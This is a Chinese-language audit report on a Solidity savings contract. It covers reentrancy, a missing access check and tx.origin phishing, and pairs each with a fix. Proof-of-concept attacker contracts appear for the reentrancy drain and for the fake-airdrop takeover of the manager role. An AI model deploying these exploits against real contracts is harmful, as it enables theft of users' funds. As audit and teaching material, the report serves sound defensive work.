# Savings 审计报告

| 项目 | 内容 |
|---|---|
| **目标合约** | [`targets/Savings.sol`](../targets/Savings.sol) |
| **审计日期** | 2026-10 |
| **审计方式** | 手动代码审计 + 攻击合约验证（PoC） |
| **漏洞总数** | **3**（高危 3） |

---

## 摘要

| ID | 标题 | 严重性 | 位置 | 类型 |
|---|---|---|---|---|
| [SV-01](#sv-01-先转账后扣账导致重入) | 先转账、后扣账导致重入 | 🔴 **High** | `withdraw()` L30 → L33 | 重入 |
| [SV-02](#sv-02-require-只检查金额不检查调用者) | `require` 只检查金额，不检查调用者 | 🔴 **High** | `collectFee()` L39 | 访问控制缺失 |
| [SV-03](#sv-03-使用-txorigin-判断身份遭钓鱼) | 使用 `tx.origin` 判断身份，遭钓鱼 | 🔴 **High** | `changeManager()` L45 | 访问控制 |

## 函数概览

| 函数 | 判定 |
|---|---|
| `save()` | ✅ 干净 |
| `withdraw()` | 🔴 重入 |
| `collectFee()` | 🔴 访问控制缺失 |
| `changeManager()` | 🔴 `tx.origin` 钓鱼 |

---

## SV-01 先转账、后扣账导致重入

**位置** `withdraw()`，L30 → L33
**严重性** 🔴 High
**类型** Reentrancy

### 描述

```solidity
function withdraw() public {
    uint amount = deposits[msg.sender];
    require(amount > 0, "nothing saved");

    (bool ok, ) = msg.sender.call{value: amount}("");   // L30  转账
    require(ok, "failed");

    deposits[msg.sender] = 0;                           // L33  改账
    totalDeposits = totalDeposits - amount;             // L34  改总账
}
```

**转账行（L30）在改账行（L33）上面** —— 这一条判断只需要三秒，也是重入的唯一前提。

`.call{value:}` 把全部剩余 gas 交给接收方，接收方在 `receive()` 里再次调用 `withdraw()` 时，L33 尚未执行，`deposits[msg.sender]` 还是旧值，`require(amount > 0)` 再次通过。

### 攻击路径

与 [TipJar TJ-01](TipJar.md#tj-01-先转账后扣账导致重入) 同构，攻击合约形同：

```solidity
contract SavingsAttacker {
    Savings public target;
    constructor(address _target) { target = Savings(_target); }

    function attack() public payable {
        target.save{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    function collect() public { payable(msg.sender).transfer(address(this).balance); }
}
```

### 影响

**合约全部资金被掏空，其他用户的存款变成坏账。**

### 修复

```solidity
function withdraw() public {
    uint amount = deposits[msg.sender];
    require(amount > 0, "nothing saved");

    deposits[msg.sender] = 0;                           // CEI：先扣账
    totalDeposits = totalDeposits - amount;
    (bool ok, ) = msg.sender.call{value: amount}("");   // 再转账
    require(ok, "failed");
}
```

修复后再次攻击：第一次进入时 `amount = deposits[attacker] = 0`，`require(amount > 0, "nothing saved")` 直接拦下（回滚信息为 `no money` / `nothing saved`），**攻击死在这一行上**。

---

## SV-02 `require` 只检查金额，不检查调用者

**位置** `collectFee()`，L39
**严重性** 🔴 High
**类型** Access Control

### 描述

```solidity
function collectFee(uint amount) public {
    require(amount <= totalDeposits / 10, "fee too high");   // L39
    payable(msg.sender).transfer(amount);                    // L40
}
```

**这里的 `require` 看起来像一道保护，但它检查的是「金额」，一个字都没提「人」。**

`require` 里的条件只有三类：

| 类型 | 例子 | 对应问题 |
|---|---|---|
| **人** | `msg.sender == owner` | 谁能按这个按钮 |
| **金额** | `amount <= x`、`msg.value >= 1 ether` | 钱的数额对不对 |
| **状态** | `amount > 0`、`pot >= 3 ether` | 当前状态是否允许 |

L39 属于第二类。它只限制了**一次能拿多少**，完全没限制**谁能拿**。

### 攻击路径

**不需要写任何攻击合约，手动点击即可。**

设 `totalDeposits = 100 ETH`：

| 步骤 | 调用 | 检查 | 结果 |
|---|---|---|---|
| 1 | 攻击者调用 `collectFee(10)` | `10 <= 100/10` ✅ | 拿走 10 ETH |
| 2 | 再调用 `collectFee(10)` | `10 <= 100/10` ✅ | **仍然通过** |
| 3 | 重复 10 次 | …… | **合约被掏空** |

关键在于：**`collectFee()` 从头到尾没有修改 `totalDeposits`**，所以 `totalDeposits / 10` 这个上限永远是 100/10 = 10，可以无限次领取。

### 影响

**任何人都能反复调用 `collectFee()`，每次拿走合约余额的 10%，直到合约归零。**

比 SV-01 更危险的地方在于：**连攻击合约都不用写** —— 手点就能完成。

### 修复

```solidity
function collectFee(uint amount) public {
    require(msg.sender == manager, "not manager");           // 先查「人」
    require(amount <= totalDeposits / 10, "fee too high");   // 再查「金额」
    totalDeposits = totalDeposits - amount;                  // 并且要扣账
    payable(msg.sender).transfer(amount);
}
```

两处都要改：**补上「人」的检查，并补上状态更新**。只补检查而不扣账，仍然可以被反复调用（只是不再是无权限的任何人）。

---

## SV-03 使用 `tx.origin` 判断身份遭钓鱼

**位置** `changeManager()`，L45
**严重性** 🔴 High
**类型** Access Control / Phishing

### 描述

```solidity
function changeManager(address newManager) public {
    if (tx.origin == manager) {          // L45
        manager = newManager;
    }
}
```

`tx.origin` 是**整条调用链的起点**，`msg.sender` 才是**直接调用者**。用 `tx.origin` 判断身份时：

- `tx.origin` = manager → 检查通过
- `msg.sender` = 攻击合约 → 但函数不检查它

### 攻击路径

```solidity
contract SavingsPhisher {
    Savings public target;
    address public hacker;

    constructor(address _target) {
        target = Savings(_target);
        hacker = msg.sender;
    }

    function fakeAirdrop() public {
        // 包装成「领取空投 / 领取补贴」，诱导 manager 点击
        target.changeManager(hacker);
    }
}
```

1. 攻击者部署 `SavingsPhisher`，`hacker` = 攻击者地址
2. 诱导 manager 点击 `fakeAirdrop()`
3. `tx.origin == manager` ✅ 通过
4. **`manager` 被改成攻击者地址** —— 攻击者随即获得了 `collectFee()` 的完整权限

> ⚠️ 本合约中 SV-02 和 SV-03 会**叠加放大**：SV-03 让攻击者拿下 manager 身份，SV-02 让他可以无限次提取资金。

### 影响

**合约管理权被完全接管**，攻击者可随意更换管理逻辑、提取资金。

### 修复

```solidity
function changeManager(address newManager) public {
    require(msg.sender == manager, "not manager");
    manager = newManager;
}
```

---

## 结论

`Savings` 一共 **3 个高危问题**，`save()` 与漏洞完全无关 —— **真实合约就是这样：一堆无关代码里藏着那两三行要命的。**

三个漏洞各自的修法：

| ID | 修法 | 改动量 |
|---|---|---|
| SV-01 | 把 L33 挪到 L30 之前 | 移动 2 行 |
| SV-02 | 补一行 `require(msg.sender == manager, ...)` + 补扣账 | 新增 2 行 |
| SV-03 | `tx.origin` → `msg.sender` | 改 1 个词 |

**这份报告暴露的通用教训：**

> **看到 `require` 不等于「这里有人管着」。**
> 必须问它里面的条件管住了**人**、**金额**、还是**状态** —— 管错了对象，等于没管。
